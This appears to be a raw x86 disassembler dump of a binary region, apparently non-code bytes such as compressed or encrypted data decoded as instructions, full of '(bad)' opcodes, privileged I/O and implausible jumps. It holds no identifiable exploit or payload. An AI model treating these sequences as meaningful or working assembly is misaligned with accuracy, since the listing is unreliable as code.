  4207be:	xchg   edx,eax
  4207bf:	dec    edi
  4207c0:	call   0xc1b2a92b
  4207c5:	add    BYTE PTR [bx+si],al
	...
  4207f0:	mov    WORD PTR [ebp+0x506e62df],ss
  4207f6:	div    DWORD PTR [eax+0x3e]
  4207f9:	pop    ebx
  4207fa:	cmp    bl,bh
  4207fc:	pop    ebx
  4207fd:	xchg   DWORD PTR [esi],edx
  4207ff:	in     eax,0x6f
  420801:	js     0x420836
  420803:	mov    esi,0x23fe7a58
  420808:	test   DWORD PTR [edx+edx*1+0x24],edi
  42080c:	jg     0x42088c
  42080e:	or     al,0xf4
  420810:	dec    esp
  420811:	xchg   DWORD PTR [eax],eax
  420813:	ficomp WORD PTR [edx-0x51]
  420816:	push   ss
  420817:	(bad)  [ebx]
  420819:	mov    cl,0xd0
  42081b:	repz adc eax,0xa9d3b395
  420821:	test   eax,0x862de5c6
  420826:	enter  0x1cf1,0xaf
  42082a:	mov    ch,0xdc
  42082c:	push   ds
  42082d:	jle    0x420836
  42082f:	shr    eax,0x81
  420832:	pop    es
  420833:	ret    
  420834:	adc    al,BYTE PTR [eax-0x7c120749]
  42083a:	xchg   ebp,eax
  42083b:	out    0x15,al
  42083d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42083e:	nop
  42083f:	fld    QWORD PTR [edi]
  420841:	test   BYTE PTR [edi-0x6b772b31],dl
  420847:	iret   
  420848:	out    0x7d,eax
  42084a:	mov    edx,esi
  42084c:	push   ecx
  42084d:	test   eax,0x5adcf790
  420852:	pushf  
  420853:	repnz add BYTE PTR [eax],al
	...
  42087e:	fmul   QWORD PTR [eax-0x79c63860]
  420884:	dec    ebp
  420885:	loopne 0x420817
  420887:	jbe    0x4208e3
  420889:	add    al,0x8e
  42088b:	jle    0x4208e6
  42088d:	clc    
  42088e:	and    DWORD PTR [eax+0x789de03e],ebx
  420894:	cmp    DWORD PTR [eax+eiz*2],eax
  420897:	xchg   BYTE PTR [ecx-0x1a],dl
  42089a:	or     DWORD PTR [ebp+0x78e04000],eax
  4208a0:	js     0x42088e
  4208a2:	pop    ds
  4208a3:	pop    ebx
  4208a4:	and    dl,dh
  4208a6:	and    ebx,DWORD PTR [ebx+0x5c]
  4208a9:	inc    eax
  4208aa:	fnstsw WORD PTR [edi+0x64]
  4208ad:	or     al,0xd2
  4208af:	or     eax,0x9522104c
  4208b4:	push   esp
  4208b5:	sbb    DWORD PTR [edx],edi
  4208b7:	mov    esi,DWORD PTR [edx+0xe]
  4208ba:	in     al,0x78
  4208bc:	popa   
  4208bd:	std    
  4208be:	and    esi,DWORD PTR [esi+0x6e]
  4208c1:	add    BYTE PTR [edx+0x3d],al
  4208c4:	js     0x42089a
  4208c6:	xchg   ecx,eax
  4208c7:	or     eax,0x9566167a
  4208cc:	inc    esi
  4208cd:	sbb    BYTE PTR [ebx+0x4c],ch
  4208d0:	xor    ah,bh
  4208d2:	jg     0x420910
  4208d4:	inc    esi
  4208d5:	sti    
  4208d6:	xor    BYTE PTR [edi+0x44],al
  4208d9:	add    DWORD PTR [edx+0x42],ebx
  4208dc:	aaa    
  4208dd:	sti    
  4208de:	dec    ebx
  4208df:	cdq    
  4208e0:	sub    edi,eax
	...
  42090a:	add    BYTE PTR [eax],al
  42090c:	xor    BYTE PTR [ebp+0x38],al
  42090f:	scas   eax,DWORD PTR es:[edi]
  420910:	jl     0x4208aa
  420912:	fadd   DWORD PTR ss:[ecx+0x3d94359b]
  420919:	popf   
  42091a:	ins    DWORD PTR es:[edi],dx
  42091b:	xchg   edi,eax
  42091c:	pop    esp
  42091d:	xchg   edi,eax
  42091e:	push   esp
  42091f:	cdq    
  420920:	xor    esi,DWORD PTR [edi+0x62]
  420923:	jmp    0x9a909da1
  420928:	bound  esi,QWORD PTR [edi+0x74]
  42092b:	jbe    0x420949
  42092d:	mov    esp,DWORD PTR [ebx+0x45]
  420930:	lock jg 0x4209a9
  420933:	dec    eax
  420934:	add    BYTE PTR [ecx+0x7e43e950],ch
  42093a:	arpl   WORD PTR [eax+0x1f],cx
  42093d:	jl     0x4209ac
  42093f:	add    BYTE PTR [edx+0x2d],dl
  420942:	jno    0x420944
  420944:	and    al,0xf8
  420946:	push   0x591774
  42094b:	add    bh,ah
  42094d:	pop    eax
  42094e:	add    BYTE PTR [eax],al
  420950:	out    0x3e,eax
  420952:	add    BYTE PTR [eax+edi*8],bh
  420955:	pop    eax
  420956:	cmp    al,0x50
  420958:	sbb    BYTE PTR [edi],ah
  42095a:	xor    BYTE PTR [edi+0x17],bl
  42095d:	clc    
  42095e:	outs   dx,DWORD PTR ds:[esi]
  42095f:	jae    0x420931
  420961:	das    
  420962:	outs   dx,DWORD PTR ds:[esi]
  420963:	test   DWORD PTR fs:[eax+0x3c],ebx
  420967:	push   ebx
  420968:	sbb    dh,BYTE PTR [ebx]
  42096a:	dec    ebp
  42096b:	pop    edi
  42096c:	push   edi
  42096d:	clc    
  42096e:	outs   dx,DWORD PTR ds:[esi]
  42096f:	jae    0x420971
	...
  420999:	add    BYTE PTR [eax+0x45646f2f],dl
  42099f:	push   edi
  4209a0:	cmp    al,0x49
  4209a2:	ficomp DWORD PTR [ecx]
  4209a4:	dec    ebp
  4209a5:	pop    edi
  4209a6:	xlat   BYTE PTR ds:[ebx]
  4209a7:	stc    
  4209a8:	outs   dx,DWORD PTR ds:[esi]
  4209a9:	jae    0x42097b
  4209ab:	das    
  4209ac:	outs   dx,DWORD PTR ds:[esi]
  4209ad:	test   DWORD PTR fs:[eax+0x3c],ebx
  4209b1:	dec    eax
  4209b2:	mov    ds:0x864d4d24,eax
  4209b7:	xor    DWORD PTR [ecx+0x5f],ebp
  4209ba:	mov    bh,0xf9
  4209bc:	outs   dx,DWORD PTR ds:[esi]
  4209bd:	jae    0x42098f
  4209bf:	das    
  4209c0:	outs   dx,DWORD PTR ds:[esi]
  4209c1:	test   DWORD PTR fs:[eax+0x0],ebx
  4209c5:	pop    esp
  4209c6:	mov    edx,0xa8726031
  4209cb:	or     ebp,DWORD PTR [esi+eiz*2-0x2d]
  4209cf:	sbb    edx,DWORD PTR [ecx+ebp*2-0x47]
  4209d3:	hlt    
  4209d4:	imul   esi,DWORD PTR [edi-0x4c],0x38
  4209d8:	dec    esp
  4209d9:	imul   edx,DWORD PTR [ecx+0x764d1cfa],0x3e00692e
  4209e3:	push   ecx
  4209e4:	fldenv [ebp-0x6e]
  4209e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209e8:	jecxz  0x420a5b
  4209ea:	fwait
  4209eb:	ss mov bh,0x66
  4209ee:	popf   
  4209ef:	push   eax
  4209f0:	fnstenv [eax-0x6f]
  4209f3:	pushf  
  4209f4:	lock pop ebx
  4209f6:	xchg   ecx,eax
  4209f7:	fisub  DWORD PTR [ebx+0x61]
  4209fb:	ins    DWORD PTR es:[edi],dx
  4209fc:	cmc    
  4209fd:	pop    ds
	...
  420a26:	add    BYTE PTR [eax],al
  420a28:	jp     0x420a95
  420a2a:	repnz bound ebx,QWORD PTR [esi]
  420a2d:	aaa    
  420a2e:	jecxz  0x420a96
  420a30:	push   0x2
  420a32:	lds    ecx,FWORD PTR [edx+0x67]
  420a35:	popa   
  420a36:	imul   BYTE PTR [ebp+ecx*2+0x5d]
  420a3a:	loop   0x420aaf
  420a3c:	bound  ebp,QWORD PTR [ebp-0x25]
  420a3f:	ins    DWORD PTR es:[edi],dx
  420a40:	and    cl,BYTE PTR ds:0xc75e70f2
  420a46:	jecxz  0x420aae
  420a48:	sbb    al,BYTE PTR [edx]
  420a4a:	(bad)  
  420a4b:	ins    BYTE PTR es:[edi],dx
  420a4c:	sbb    BYTE PTR [esi],ch
  420a4e:	repnz pop esi
  420a50:	or     al,0x17
  420a52:	lds    ecx,FWORD PTR [edx+0x27]
  420a55:	and    ebx,esi
  420a57:	ins    BYTE PTR es:[edi],dx
  420a58:	or     eax,0xe273df1d
  420a5d:	in     al,dx
  420a5e:	fld    TBYTE PTR [ebp-0x1e]
  420a61:	int3   
  420a62:	icebp  
  420a63:	jo     0x420a83
  420a65:	(bad)  
  420a66:	jecxz  0x420ace
  420a68:	fiadd  DWORD PTR [ecx]
  420a6a:	(bad)  
  420a6b:	ins    BYTE PTR es:[edi],dx
  420a6c:	fsubr  st,st(5)
  420a6e:	icebp  
  420a6f:	pop    esi
  420a70:	int3   
  420a71:	(bad)  
  420a72:	les    edx,FWORD PTR [ecx-0x19]
  420a75:	out    0xc3,al
  420a77:	jno    0x420a4b
  420a79:	nop
  420a7a:	lds    eax,FWORD PTR [ecx+0xc]
  420a7d:	out    0xd5,al
  420a7f:	bound  esi,QWORD PTR [edx-0x66922370]
  420a85:	pop    ebx
  420a86:	pop    edx
  420a87:	add    al,0x82
  420a89:	jl     0x420ade
  420a8b:	in     eax,0x0
	...
  420ab5:	add    BYTE PTR [ebp+0x74],bh
  420ab8:	pop    ecx
  420ab9:	add    al,0x82
  420abb:	jl     0x420b10
  420abd:	in     eax,0x7d
  420abf:	je     0x420afa
  420ac1:	(bad)  
  420ac2:	push   0x60b8e776
  420ac7:	je     0x420b0c
  420ac9:	out    0x6a,al
  420acb:	cmp    ebp,0xffffffdc
  420ace:	arpl   WORD PTR [edi+eiz*8-0x2a],si
  420ad2:	pop    edx
  420ad3:	adc    DWORD PTR [ebx],0xc8d80f3
  420ad9:	enter  0x7a89,0xa
  420add:	(bad)  [ecx]
  420adf:	scas   al,BYTE PTR es:[edi]
  420ae0:	add    bh,dh
  420ae2:	dec    ebp
  420ae3:	or     BYTE PTR [edi+esi*8],0x21
  420ae7:	xchg   esp,eax
  420ae8:	add    eax,0x89ab9e7
  420aed:	lock sbb DWORD PTR [ebx-0x3d],ebx
  420af1:	rcr    DWORD PTR [edx],cl
  420af3:	jle    0x420ac3
  420af5:	(bad)  
  420af6:	sub    BYTE PTR [esi+0x3924e0db],cl
  420afc:	rcr    cl,0x18
  420aff:	pop    ebx
  420b00:	xchg   edi,eax
  420b01:	cmc    
  420b02:	sbb    al,BYTE PTR [edx+0x5b14e4b9]
  420b08:	stos   DWORD PTR es:[edi],eax
  420b09:	in     al,0xed
  420b0b:	jnp    0x420aa4
  420b0d:	in     al,0xed
  420b0f:	jb     0x420af8
  420b11:	in     al,0xde
  420b13:	jge    0x420aa3
  420b15:	lock ror DWORD PTR [esi+0x199a],cl
	...
  420b44:	loope  0x420bbe
  420b46:	add    BYTE PTR [ebx],0xf2
  420b49:	stos   BYTE PTR es:[edi],al
  420b4a:	xchg   esi,eax
  420b4b:	out    0xda,al
  420b4d:	ja     0x420ad7
  420b4f:	(bad)  
  420b51:	pop    edx
  420b52:	add    BYTE PTR [edx+0x76748014],bl
  420b58:	sbb    cl,BYTE PTR [ebx+eiz*2+0x6177e545]
  420b5f:	pop    ebx
  420b60:	add    DWORD PTR [esi+0x67],edi
  420b63:	and    al,0x1d
  420b65:	sub    DWORD PTR [ecx+ebp*8-0x30],0xe6505f74
  420b6d:	dec    eax
  420b6e:	fs inc ebp
  420b70:	or     BYTE PTR [ebp+0x71],bh
  420b73:	cmp    al,BYTE PTR [edx-0x51]
  420b76:	arpl   WORD PTR [edx+0x12],cx
  420b79:	js     0x420be8
  420b7b:	adc    eax,0xe9777f07
  420b80:	or     eax,0xf93a7077
  420b85:	mov    esi,DWORD PTR [esi+0x4]
  420b88:	enter  0x4d09,0x16
  420b8c:	rcr    BYTE PTR [ecx+0x9d1fb6d],cl
  420b92:	dec    ebp
  420b93:	push   es
  420b94:	mov    dl,0x48
  420b96:	popa   
  420b97:	or     dl,BYTE PTR [edi+0x3ddd6e8c]
  420b9d:	stos   DWORD PTR es:[edi],eax
  420b9e:	ins    DWORD PTR es:[edi],dx
  420b9f:	(bad)  [ebp-0x71258e58]
  420ba5:	jbe    0x420c19
  420ba7:	lds    eax,FWORD PTR [eax]
	...
  420bd1:	add    BYTE PTR ds:0x8dbd6bac,bh
  420bd7:	stos   BYTE PTR es:[edi],al
  420bd8:	arpl   WORD PTR [ebx-0x168d8371],di
  420bde:	xchg   edx,eax
  420bdf:	je     0x420c55
  420be1:	mov    ecx,0x9d72768d
  420be6:	cmp    eax,0x6d956bac
  420beb:	dec    eax
  420bec:	popa   
  420bed:	mov    dh,BYTE PTR [esi-0x74]
  420bf0:	outs   dx,BYTE PTR ds:[esi]
  420bf1:	xchg   ebp,eax
  420bf2:	cmp    eax,0xcb006bac
  420bf7:	or     eax,0xec4614d
  420bfc:	je     0x420c6d
  420bfe:	mov    ch,0x28
  420c00:	std    
  420c01:	pusha  
  420c02:	(bad)  
  420c03:	jmp    FWORD PTR [ebx+0x75]
  420c06:	xchg   ecx,eax
  420c07:	or     ebp,DWORD PTR [ebx]
  420c09:	arpl   WORD PTR [ecx-0x6],di
  420c0c:	cld    
  420c0d:	pusha  
  420c0e:	test   dh,bh
  420c10:	imul   esi,DWORD PTR [ebp+0x51],0xb
  420c14:	sub    esp,DWORD PTR [ebx+0x79]
  420c17:	and    eax,0xfc555bfd
  420c1c:	jo     0x420c6b
  420c1e:	xchg   BYTE PTR [ecx+ebp*2],ah
  420c21:	add    BYTE PTR [ebx+0x2b],al
  420c24:	gs neg DWORD PTR gs:[esi]
  420c28:	pop    esi
  420c29:	je     0x420c21
  420c2b:	pop    esp
  420c2c:	dec    edi
  420c2d:	outs   dx,DWORD PTR ds:[esi]
  420c2e:	dec    ecx
  420c2f:	or     esi,DWORD PTR [ecx+eiz*2+0x35]
  420c33:	sub    BYTE PTR [ecx+0x52],bl
	...
  420c5e:	add    BYTE PTR [eax],al
  420c60:	push   cs
  420c61:	sub    ebx,DWORD PTR [ecx+0x54]
  420c64:	das    
  420c65:	sub    BYTE PTR ds:0x1e0b4642,bl
  420c6b:	add    BYTE PTR [edx+eiz*1+0x63],dl
  420c6f:	je     0x420bf9
  420c71:	std    
  420c72:	outs   dx,BYTE PTR ds:[esi]
  420c73:	gs jecxz 0x420ca4
  420c76:	inc    esi
  420c77:	push   esp
  420c78:	rcr    DWORD PTR [eax],cl
  420c7a:	gs gs inc edi
  420c7d:	and    DWORD PTR [esi+0x74],ebx
  420c80:	adc    edx,DWORD PTR ss:[edx+0x73]
  420c84:	jp     0x420c94
  420c86:	jo     0x420ca8
  420c88:	mov    ebp,DWORD PTR [ecx]
  420c8a:	ins    DWORD PTR es:[edi],dx
  420c8b:	outs   dx,DWORD PTR ds:[esi]
  420c8c:	stos   DWORD PTR es:[edi],eax
  420c8d:	pop    esp
  420c8e:	push   ebx
  420c8f:	outs   dx,DWORD PTR ds:[esi]
  420c90:	lds    esp,FWORD PTR [edi]
  420c92:	data16 outs dx,BYTE PTR ds:[esi]
  420c94:	mov    eax,0x3e69443c
  420c99:	in     al,0xdd
  420c9b:	pusha  
  420c9c:	retf   0xf388
  420c9f:	jbe    0x420cdf
  420ca1:	loop   0x420c95
  420ca3:	ins    BYTE PTR es:[edi],dx
  420ca4:	fld    DWORD PTR [ebx-0x247d951e]
  420caa:	repnz (bad) 
  420cac:	jl     0x420c37
  420cae:	out    dx,al
  420caf:	ins    DWORD PTR es:[edi],dx
  420cb0:	mov    dl,0xf2
  420cb2:	mov    esp,0xef939862
  420cb7:	imul   edx,DWORD PTR [edx-0x7399430e],0x52
  420cbe:	and    DWORD PTR [ebx],esp
  420cc0:	mov    ds:0x4ad1f2,al
	...
  420ced:	add    BYTE PTR [edx+0x62],ch
  420cf0:	and    al,0x43
  420cf2:	imul   edx,DWORD PTR [ebx+0x331e6bdb],0xffffffe0
  420cf9:	arpl   WORD PTR [edi+edx*2-0xf],bp
  420cfd:	jo     0x420d3d
  420cff:	inc    ebp
  420d00:	mov    bh,0x53
  420d02:	outs   dx,BYTE PTR ds:[esi]
  420d03:	adc    dl,dl
  420d05:	bound  ecx,QWORD PTR [eax+esi*2-0x21]
  420d09:	jno    0x420d49
  420d0b:	bound  esi,QWORD PTR [ebp-0x2dedf2b1]
  420d11:	bound  ebp,QWORD PTR [eax+ecx*1]
  420d14:	loopne 0x420d87
  420d16:	bound  esi,QWORD PTR ds:[ebp-0x30ad92b1]
  420d1d:	jo     0x420d3a
  420d1f:	and    al,0x21
  420d21:	dec    esi
  420d22:	pop    ds
  420d23:	pop    ds
  420d24:	loopne 0x420d25
  420d26:	in     al,dx
  420d27:	out    0xcc,al
  420d29:	dec    edi
  420d2a:	pop    esi
  420d2b:	out    0xf1,eax
  420d2d:	bound  ecx,QWORD PTR [edx+edx*2]
  420d30:	mov    dh,0x5e
  420d32:	jmp    0x420d4a
  420d34:	add    DWORD PTR [esi+0x0],ecx
  420d37:	out    dx,al
  420d38:	rcr    BYTE PTR [edi],1
  420d3a:	add    ebx,DWORD PTR [ebx-0x6c]
  420d3d:	in     al,0xd8
  420d3f:	jbe    0x420d08
  420d41:	(bad)  
  420d42:	fnstsw WORD PTR [esi-0x67]
  420d45:	loopne 0x420d15
  420d47:	mov    esp,edi
  420d49:	mov    ch,0xfb
  420d4b:	scas   al,BYTE PTR es:[edi]
  420d4c:	xchg   edi,eax
  420d4d:	and    ebp,ebp
  420d4f:	mov    eax,DWORD PTR [ecx+esi*8+0x0]
	...
  420d7a:	add    BYTE PTR [eax],al
  420d7c:	pop    ecx
  420d7d:	xchg   ebp,eax
  420d7e:	mov    al,bl
  420d80:	pushf  
  420d81:	pop    ebx
  420d82:	popf   
  420d83:	mov    ch,0x8d
  420d85:	stos   DWORD PTR es:[edi],eax
  420d86:	pop    es
  420d87:	rcr    DWORD PTR [ecx+ecx*4+0x5b8fe155],cl
  420d8e:	and    BYTE PTR [ecx-0x2cf854b0],bh
  420d94:	pushf  
  420d95:	mov    DWORD PTR ds:0x305b8fe1,edi
  420d9b:	mov    ecx,0xd107ab38
  420da0:	outs   dx,BYTE PTR ds:[esi]
  420da1:	cmp    BYTE PTR [ecx],0x24
  420da4:	js     0x420e22
  420da6:	adc    al,0xe1
  420da8:	loope  0x420d49
  420daa:	or     al,0xe5
  420dac:	pusha  
  420dad:	ja     0x420d96
  420daf:	mov    ebx,0x2437af6d
  420db4:	ins    DWORD PTR es:[edi],dx
  420db5:	mov    cl,BYTE PTR [edx+esi*8]
  420db8:	rcr    DWORD PTR [esi+0x3b09d013],0x1a
  420dbf:	loope  0x420df0
  420dc1:	lea    eax,[edx+esi*8]
  420dc4:	dec    ecx
  420dc5:	mov    al,0xb9
  420dc7:	mov    bh,0xa1
  420dc9:	xchg   esi,eax
  420dca:	scas   al,BYTE PTR es:[edi]
  420dcb:	ror    DWORD PTR [esi+0x3b],cl
  420dce:	mov    esp,0xe7891cf2
  420dd3:	mov    esp,0x23979bf4
  420dd8:	in     eax,dx
  420dd9:	mov    esp,eax
  420ddb:	icebp  
  420ddc:	jns    0x420d7c
  420dde:	add    BYTE PTR [ebp+0x0],bl
	...
  420e08:	add    BYTE PTR [eax],al
  420e0a:	adc    DWORD PTR [esi+0x728ac84b],0x796cbc20
  420e14:	jb     0x420ddf
  420e16:	xchg   ebx,eax
  420e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e18:	imul   ecx,DWORD PTR [ebp+edi*1+0x6db55493],0xffffff91
  420e20:	pop    edi
  420e21:	nop
  420e22:	imul   esp,DWORD PTR [esi+0x51],0x63902f84
  420e29:	jnp    0x420e68
  420e2b:	lods   al,BYTE PTR ds:[esi]
  420e2c:	dec    ebx
  420e2d:	xchg   ebp,eax
  420e2e:	or     eax,0x15a5366
  420e33:	mov    WORD PTR [eax],es
  420e35:	jmp    0x1a92a527
  420e3a:	pop    edx
  420e3b:	stos   DWORD PTR es:[edi],eax
  420e3c:	ins    DWORD PTR es:[edi],dx
  420e3d:	pop    ebx
  420e3e:	push   cs
  420e3f:	push   es
  420e40:	push   edx
  420e41:	xor    al,0xee
  420e43:	xchg   ebp,eax
  420e44:	and    BYTE PTR [ecx],bl
  420e46:	adc    ecx,DWORD PTR [esp+esi*2+0x3f90b4e9]
  420e4d:	sbb    DWORD PTR [edx],esp
  420e4f:	stos   DWORD PTR es:[edi],eax
  420e50:	ins    DWORD PTR es:[edi],dx
  420e51:	sbb    ebp,esi
  420e53:	add    eax,0x959339fd
  420e58:	xor    ecx,ecx
  420e5a:	in     eax,dx
  420e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e5c:	jno    0x420e78
  420e5e:	(bad)  [esi+0x72]
  420e61:	or     eax,0x2c475b0c
  420e66:	jge    0x420dfd
  420e68:	and    BYTE PTR [ecx],bl
  420e6a:	popf   
  420e6b:	mov    dh,BYTE PTR [ecx-0xa]
	...
  420e96:	add    BYTE PTR [eax],al
  420e98:	xchg   edx,eax
  420e99:	mov    esp,DWORD PTR [ebx+ebx*1+0x3a]
  420e9d:	xchg   ebp,eax
  420e9e:	dec    esi
  420e9f:	mov    ch,0x6d
  420ea1:	gs push eax
  420ea3:	enter  0x8a8e,0x75
  420ea7:	mov    esi,0x32798f
  420eac:	xchg   edi,eax
  420ead:	rcl    DWORD PTR [eax+0x54],0xd7
  420eb1:	int3   
  420eb2:	pop    ebp
  420eb3:	imul   edi,DWORD PTR [ebx+0x39],0xaa46150
  420eba:	je     0x420f2b
  420ebc:	lds    esp,FWORD PTR ds:0xcc94002f
  420ec2:	push   eax
  420ec3:	push   eax
  420ec4:	xchg   DWORD PTR [ecx],ebp
  420ec6:	pop    esi
  420ec7:	jae    0x420e6d
  420ec9:	imul   BYTE PTR [ebx+0x72]
  420ecc:	mov    bl,0x4b
  420ece:	add    BYTE PTR [eax],al
  420ed0:	xlat   BYTE PTR ds:[ebx]
  420ed1:	iret   
  420ed2:	dec    esp
  420ed3:	xor    eax,DWORD PTR [edi]
  420ed5:	sub    DWORD PTR [esi+0x73],ebx
  420ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ed9:	imul   DWORD PTR [ebx+0x72]
  420edc:	jae    0x420f3d
  420ede:	inc    ebp
  420edf:	dec    ebp
  420ee0:	data16 das 
  420ee2:	sbb    eax,0x700a8650
  420ee7:	ja     0x420f31
  420ee9:	or     DWORD PTR [ecx+0x0],esp
  420eec:	dec    ecx
  420eed:	int    0x50
  420eef:	push   eax
  420ef0:	inc    edi
  420ef1:	das    
  420ef2:	pop    esi
  420ef3:	jae    0x420f29
  420ef5:	imul   BYTE PTR [ebx+0x72]
  420ef8:	sbb    DWORD PTR [edi+0x48],0x54
	...
  420f24:	add    BYTE PTR [eax],al
  420f26:	and    ebp,DWORD PTR [edi]
  420f28:	sbb    eax,0x700a4650
  420f2d:	ja     0x420f67
  420f2f:	or     DWORD PTR [ecx+0x0],esp
  420f32:	add    al,0xcc
  420f34:	push   eax
  420f35:	push   eax
  420f36:	imul   DWORD PTR [eax]
  420f38:	pop    esi
  420f39:	jae    0x420eef
  420f3b:	imul   DWORD PTR [ebx+0x72]
  420f3e:	inc    ebx
  420f3f:	pop    edi
  420f40:	add    BYTE PTR [ebx-0x58],dl
  420f43:	es jno 0x420fbd
  420f46:	jbe    0x420f52
  420f48:	bound  ebx,QWORD PTR [edx+ebp*8+0x21]
  420f4c:	pusha  
  420f4d:	jb     0x420f8d
  420f4f:	sbb    eax,0x2e206cf0
  420f54:	lds    eax,FWORD PTR [esi+0x10]
  420f57:	(bad)  
  420f58:	fnsave [ecx-0x18]
  420f5b:	push   ds
  420f5c:	in     eax,dx
  420f5d:	pop    ds
  420f5e:	call   DWORD PTR [eax]
  420f60:	loopne 0x420fce
  420f62:	repz ret 
  420f64:	in     al,dx
  420f65:	pop    ds
  420f66:	repz rcl dl,cl
  420f69:	pop    esi
  420f6a:	loope  0x420f4a
  420f6c:	out    dx,al
  420f6d:	pop    ebx
  420f6e:	call   eax
  420f70:	fild   QWORD PTR [ebx+edx*8-0x7d]
  420f74:	in     eax,dx
  420f75:	jo     0x420fb5
  420f77:	retf   
  420f78:	fsub   QWORD PTR [edx-0x58]
  420f7b:	mov    ds,edx
  420f7d:	jae    0x420f26
  420f7f:	xlat   BYTE PTR ds:[ebx]
  420f80:	out    dx,eax
  420f81:	dec    DWORD PTR [ebp+eax*4-0x6c568c25]
  420f88:	(bad)  
  420f89:	bound  eax,QWORD PTR [eax]
	...
  420fb3:	add    BYTE PTR [edx+0x37],bh
  420fb6:	jmp    0x421018
  420fb8:	mov    WORD PTR [ebp-0x515f932b],ds
  420fbe:	ror    BYTE PTR [eax+ebx*4-0x6c],0xeb
  420fc3:	pusha  
  420fc4:	arpl   WORD PTR [esi-0x2f],sp
  420fc7:	jb     0x421033
  420fc9:	sahf   
  420fca:	icebp  
  420fcb:	ins    BYTE PTR es:[edi],dx
  420fcc:	push   ebp
  420fcd:	push   esi
  420fce:	ror    DWORD PTR [edx+0x77],1
  420fd1:	adc    al,ah
  420fd3:	pusha  
  420fd4:	pop    ebp
  420fd5:	push   ebp
  420fd6:	xlat   BYTE PTR ds:[ebx]
  420fd7:	ins    DWORD PTR es:[edi],dx
  420fd8:	dec    edx
  420fd9:	adc    dl,al
  420fdb:	pop    esi
  420fdc:	pop    eax
  420fdd:	push   ebx
  420fde:	jmp    0xc3805c45
  420fe3:	pusha  
  420fe4:	sbb    eax,0x2a6dd755
  420fe9:	add    DWORD PTR [ecx],eax
  420feb:	push   ecx
  420fec:	sbb    DWORD PTR [eax+ebx*8+0x74],ebx
  420ff0:	pop    ds
  420ff1:	pop    ebx
  420ff2:	fld1   
  420ff4:	cmc    
  420ff5:	xchg   ebp,eax
  420ff6:	shl    dh,1
  420ff8:	pcmpeqb mm3,mm2
  420ffb:	repnz and ecx,DWORD PTR [edi+0x7518baab]
  421002:	retf   
  421003:	repnz xacquire xchg DWORD PTR [edi],eax
  421007:	ror    BYTE PTR ds:0xefd8aaa7,cl
  42100d:	mov    ah,al
  42100f:	icebp  
  421010:	in     eax,dx
  421011:	lods   al,BYTE PTR ds:[esi]
  421012:	mov    ebp,ss
  421014:	into   
  421015:	jno    0x420fa5
  421017:	icebp  
	...
  421040:	add    BYTE PTR [eax],al
  421042:	cmc    
  421043:	stos   DWORD PTR es:[edi],eax
  421044:	xor    cl,0xdd
  421047:	jae    0x420fdf
  421049:	(bad)  
  42104a:	and    DWORD PTR [esi+0x7caed68c],edx
  421050:	xchg   ah,ch
  421052:	mov    ds:0xacb6c77a,eax
  421057:	jge    0x4210d3
  421059:	fsubr  QWORD PTR [esi+0x75f14c87]
  42105f:	stos   DWORD PTR es:[edi],eax
  421060:	pop    ecx
  421061:	repz fwait
  421063:	je     0x4210a8
  421065:	jmp    0xed5eaff8
  42106a:	sahf   
  42106b:	lea    edx,[esi-0x29]
  42106e:	push   0x79
  421070:	xor    esp,DWORD PTR [ebx+eax*4]
  421073:	mov    BYTE PTR [ebx],bh
  421075:	lock pop edx
  421077:	jb     0x4210bb
  421079:	and    al,0x79
  42107b:	jno    0x421098
  42107d:	jmp    0xd84681d1
  421082:	xor    DWORD PTR [esi+0x744dd80c],ebp
  421088:	std    
  421089:	jmp    0x8723:0xf31a5b4e
  421090:	mul    ah
  421092:	das    
  421093:	js     0x421095
  421095:	adc    eax,0xfb61798f
  42109a:	lods   al,BYTE PTR ds:[esi]
  42109b:	mov    ebp,DWORD PTR [ebp-0x31]
  42109e:	jno    0x421046
  4210a0:	push   ebp
  4210a1:	ror    BYTE PTR [edi+0xde6d7e],1
	...
  4210cf:	add    BYTE PTR [eax+0x62],dh
  4210d2:	dec    esi
  4210d3:	mov    ch,0xc1
  4210d5:	fwait
  4210d6:	jae    0x421093
  4210d8:	xchg   ebx,eax
  4210d9:	jge    0x421149
  4210db:	mov    ch,0xb7
  4210dd:	jge    0x421151
  4210df:	mov    edx,0x8d6e6f5a
  4210e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210e5:	jns    0x421155
  4210e7:	lea    ecx,[edi+eax*4+0x71]
  4210eb:	leave  
  4210ec:	outs   dx,BYTE PTR ds:[esi]
  4210ed:	jge    0x421160
  4210ef:	call   0x6254:0x7f677762
  4210f6:	push   ecx
  4210f7:	jl     0x42111c
  4210f9:	mov    esi,DWORD PTR [edi+0x7a]
  4210fc:	or     DWORD PTR [ebp+0x6b],edi
  4210ff:	xchg   ebp,eax
  421100:	in     eax,dx
  421101:	mov    ebp,DWORD PTR [ebp-0x79]
  421104:	adc    dh,BYTE PTR [esi+0x63]
  421107:	pop    edx
  421108:	dec    BYTE PTR [esi+0x6f0e5573]
  42110e:	ins    DWORD PTR es:[edi],dx
  42110f:	inc    edx
  421110:	inc    edx
  421111:	lods   al,BYTE PTR ds:[esi]
  421112:	ins    DWORD PTR es:[edi],dx
  421113:	inc    edi
  421114:	out    0x86,al
  421116:	pop    edi
  421117:	cmp    esp,ecx
  421119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42111a:	dec    ebx
  42111b:	push   eax
  42111c:	fisttp DWORD PTR [ebx+0x77ef3a6d]
  421122:	je     0x421131
  421124:	cmc    
  421125:	outs   dx,DWORD PTR ds:[esi]
  421126:	je     0x421134
  421128:	lock outs dx,DWORD PTR ds:[esi]
  42112a:	arpl   WORD PTR ds:0xa61421a,dx
  421130:	iret   
  421131:	mov    WORD PTR [esi+0x15],gs
	...
  42115c:	add    BYTE PTR [eax],al
  42115e:	sbb    dl,BYTE PTR [esi-0x1aeffa1]
  421164:	arpl   WORD PTR [ebp-0x4b],sp
  421167:	pop    ebp
  421168:	dec    ebx
  421169:	jne    0x421116
  42116b:	icebp  
  42116c:	imul   ebp,DWORD PTR [edi+0x3c],0x57
  421170:	pop    esp
  421171:	inc    ecx
  421172:	test   dh,dh
  421174:	imul   esi,DWORD PTR [ebp-0x7f],0x29
  421178:	jo     0x42117a
  42117a:	jle    0x421175
  42117c:	popa   
  42117d:	outs   dx,BYTE PTR ds:[esi]
